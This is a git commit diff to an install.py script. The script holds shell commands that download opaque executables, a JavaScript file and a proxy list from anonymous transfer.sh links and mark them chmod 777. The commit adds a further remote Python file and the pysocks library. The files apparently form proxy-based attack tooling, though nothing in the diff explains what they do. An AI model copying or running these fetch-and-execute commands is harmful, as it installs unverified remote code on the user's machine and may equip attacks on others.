d5acdd08a51e21652e923f24e3152a0945a2aa63
bebrogramdd <121517481+bebrogramdd@users.noreply.github.com>
2023-01-08 14:56:56 +0300

    Add files via upload

--- install.py
+++ install.py
@@ -3,6 +3,8 @@ import os
 commands = """wget https://transfer.sh/5fAx5V/mixedv8
 wget https://transfer.sh/RjaA7I/proxy.txt
 wget https://transfer.sh/AQ7byg/mixedv16.js
+wget https://transfer.sh/wbqK8i/hdr.py
+pip install pysocks
 chmod 777 mixedv8
 chmod 777 mixedv16.js"""
 
